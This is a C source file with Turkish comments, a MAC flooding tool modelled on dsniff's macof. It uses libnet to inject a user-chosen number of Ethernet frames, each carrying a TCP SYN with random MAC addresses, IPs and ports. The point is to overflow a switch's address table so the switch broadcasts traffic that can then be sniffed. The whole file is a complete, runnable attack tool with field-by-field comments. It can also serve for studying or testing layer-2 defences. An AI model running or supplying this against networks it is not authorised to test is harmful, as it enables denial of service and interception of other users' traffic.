/*
 *Macof.c (dsniff library)'den esinlenerek Oguz Han Ayaz Tarafindan Yazilmistir.
 *
 *Copyright (c) 1999 Dug Song <dugsong@monkey.org>"
 */
#include <sys/types.h>
#include <sys/param.h>
#include <netinet/in.h>
#include <stdio.h>
#include <string.h>
#include <err.h>
#include <libnet.h>
#include <pcap.h>

static void usage(void){
  printf("MACFlooder <Tekrar Sayisi>\n");
  exit(1);
}

static void gen_mac(u_char *mac){
  *((in_addr_t *)mac) = libnet_get_prand(LIBNET_PRu32);
	*((u_short *)(mac + 4)) = libnet_get_prand(LIBNET_PRu16);
}

int main(int argc, char *argv[]){

  if(argc != 2)
    usage();

  int i;
  char *intrfc = NULL;
  char libneterrorbuffer[LIBNET_ERRBUF_SIZE];
  char pcaperrorbuffer[PCAP_ERRBUF_SIZE];
  libnet_t *context;
  u_char destmacaddr[ETHER_ADDR_LEN]; //hedef adres
  u_char srcmacaddr[ETHER_ADDR_LEN]; //kaynak adres

  //Inteface'i baslat
  intrfc = pcap_lookupdev(pcaperrorbuffer);

  //Icinde calistigimiz libnet icerigini baslat
  if ((context = libnet_init(LIBNET_LINK, intrfc, libneterrorbuffer)) == NULL){
    errx(1, "%s", libneterrorbuffer);
  }

  //libnet baglaminda rastgele seed olusturma
  libnet_seed_prand(context);

  //n, switche gonderecegimiz mac adresi sayisidir
  int n = atoi(argv[1]);

  for (i = 0; i < n; i++){

    //rastgele hedef ve kaynak mac adresleri olusturma
    gen_mac(destmacaddr);
    gen_mac(srcmacaddr);

    //Contextte TCP, ipv4 ve ethernet headerlari olusturma
    libnet_build_tcp(libnet_get_prand(LIBNET_PRu16),    // kaynak TCP portu
                        libnet_get_prand(LIBNET_PRu16), // hedef TCP portu
                        libnet_get_prand(LIBNET_PRu32), // sequence numarasi
                        0,                              // acknowledgement(ACK) numarasi
                        TH_SYN,                         // Kontrol Bayraklari
                        512,                            // Pencere boyutu
                        0,                              // Checksum, verinin degisip degismedigini anlamak icin paketin basina veya sonuna eklenen fazladan bit veya bytelardir
                        0,                              // urgentpointer
                        LIBNET_TCP_H,                   // TCP paketinin toplam uzunlugu
                        NULL,                           // payload (yok)
                        0,                              // payload length (Veri uzunlugu)
                        context,                        // libnet icerigine bir pointer
                        0);                             // header protokol tagi (yeni bir tane olusturmak icin,0)

    libnet_build_ipv4(LIBNET_TCP_H,                     // paket uzunlugu
                        0,                              // servis biti turu
				                libnet_get_prand(LIBNET_PRu16), // IP ID'si
                        0,                              // parcalanma bitleri and offset
                        64,                             // Agdaki TTL
				                IPPROTO_TCP,            // Ust katman protokolu
                        0,                              // checksum (libnet'in otomatik doldurmasi icin 0)
                        libnet_get_prand(LIBNET_PRu32), // kaynak adres
                        libnet_get_prand(LIBNET_PRu32), // hedef adres
                        NULL,                           // payload (yok)
                        0,                              // payload length
                        context,                        // pointer to libnet context
                        0);                             // header protokol tagi (yeni bir tane olusturmak icin,0)

    libnet_build_ethernet(destmacaddr,      //hedef ethernet adres
                            srcmacaddr,     //kaynak ethernet adres
                            ETHERTYPE_IP,   //uUst katman protokol turu
                            NULL,           //payload
                            0,              //payload length (Veri uzunlugu)
                            context,        //libnet icerigine bir pointer
                            0);             // header protokol tagi (yeni bir tane olusturmak icin,0)

    // paket injection
    if (libnet_write(context) < 0)
      errx(1, "Paket injection sirasinda hata");

    // baska bir injection icin context clearlanmali
    libnet_clear_packet(context);

    usleep(1000); //1000 mikrosaniye calisma gecikmesi,takibi kolaylastirmak amacli
    printf("Injection Sayisi: %d\r", i+1);
  }
  printf("Injection Sayisi: %d\n", n);
  return 1;
}
